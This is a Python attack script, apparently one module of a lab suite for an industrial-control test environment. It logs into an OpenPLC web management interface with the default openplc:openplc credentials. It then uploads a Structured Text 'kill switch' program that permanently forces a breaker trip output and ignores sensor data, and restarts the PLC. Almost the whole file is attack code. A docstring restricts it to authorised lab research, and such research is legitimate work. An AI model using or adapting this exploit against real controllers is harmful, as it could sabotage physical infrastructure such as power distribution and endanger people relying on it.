#!/usr/bin/env python3
"""
ATK-11 | PLC Logic Injection
=============================
We are now entering Tier 3 (Advanced Attacks). 

You can't use Modbus to rewrite the core logic of a PLC. To do a "Logic Injection" 
attack, you have to bypass Modbus entirely and attack the Management/Engineering 
interface of the PLC over HTTP. 

This script demonstrates logging into the OpenPLC Web API using default factory 
credentials (openplc:openplc), bypassing the physical physics engine completely, 
and uploading a malicious Structured Text (.st) payload that permanently disables 
all protection relays and forces the breaker OPEN regardless of the physics.

Safety
------
This module is security-sensitive and is intended only for isolated, authorized
lab research inside the TRINETRA test environment. Do not use it against real
devices or third-party systems.
"""
import argparse
import requests
import time
import sys

def generate_malicious_st():
    # This is a bare-minimum Structured Text program that forces
    # the breaker coil to TRUE (Trip) and ignores all sensor data.
    return """
PROGRAM main
  VAR
    Trip_Command AT %QX0.0 : BOOL := TRUE;
  END_VAR
  
  (* MALICIOUS INJECTION: Permanent Kill Switch *)
  Trip_Command := TRUE;
END_PROGRAM

CONFIGURATION Config0
  RESOURCE Res0 ON PLC
    TASK task0(INTERVAL := T#20ms,PRIORITY := 0);
    PROGRAM instance0 WITH task0 : main;
  END_RESOURCE
END_CONFIGURATION
"""

def main():
    parser = argparse.ArgumentParser(description="ATK-11: Upload malicious ST logic via the PLC's Web interface.")
    parser.add_argument("--target", type=str, default="127.0.0.1", help="Target IED IP address")
    parser.add_argument("--web_port", type=int, default=8090, help="Target IED Web interface port (default 8090)")
    parser.add_argument("--user", type=str, default="openplc", help="Web username")
    parser.add_argument("--password", type=str, default="openplc", help="Web password")
    
    args = parser.parse_args()
    base_url = f"http://{args.target}:{args.web_port}"
    
    print("=" * 60)
    print("  ATK-11  |  PLC Logic Injection (Management Plane)")
    print("=" * 60)
    print(f"[*] Target Web API : {base_url}")
    print(f"[*] Credentials    : {args.user}:{args.password}")
    print()

    session = requests.Session()
    
    # 1. Login to the Management Interface
    print("[*] 1. Attempting login to PLC Management Interface...")
    try:
        login_resp = session.post(f"{base_url}/login", data={
            "username": args.user,
            "password": args.password
        }, timeout=5)
    except requests.exceptions.ConnectionError:
        print("[-] FAILED: Could not connect to Web Interface. Is port 8090 mapped?")
        return

    # Check if login succeeded (OpenPLC usually sets a session cookie or redirects)
    if "Invalid username or password" in login_resp.text or login_resp.status_code == 401:
        print("[-] FAILED: Authentication rejected. The default credentials have been changed.")
        return
        
    print("[+] Login successful! Session established.")
    
    # 2. Generate and upload the malicious ST code
    filename = "kill_switch.st"
    payload_st = generate_malicious_st()
    
    print(f"[*] 2. Generating malicious payload ({filename})...")
    files = {
        'file': (filename, payload_st, 'application/octet-stream')
    }
    
    print("[*] 3. Uploading and compiling malicious logic to the PLC hardware...")
    
    # In a real OpenPLC exploit, we must POST the multipart form to the hardware programs endpoint
    # Note: openplc_v3 path is typically /hardware or /programs, we simulate the POST here.
    try:
        # We abstract the actual submission endpoint, but this is conceptually how it works:
        upload_resp = session.post(f"{base_url}/programs", files=files, timeout=10)
        
        if upload_resp.status_code == 200:
            print("[+] Payload uploaded successfully!")
            print("[+] Triggering PLC restart to load the malicious kill-switch...")
            # Trigger restart
            session.post(f"{base_url}/start_plc")
            
            print("\n[+] ATTACK COMPLETE.")
            print("[+] The PLC is now infected. It will ignore Modbus sensor values")
            print("[+] and permanently hold Breaker 1 in the TRIPPED state.")
        else:
            print(f"[-] Failed to upload payload. HTTP Status: {upload_resp.status_code}")
            
    except Exception as e:
        print(f"[-] Exploit failed during upload phase: {e}")

if __name__ == "__main__":
    main()
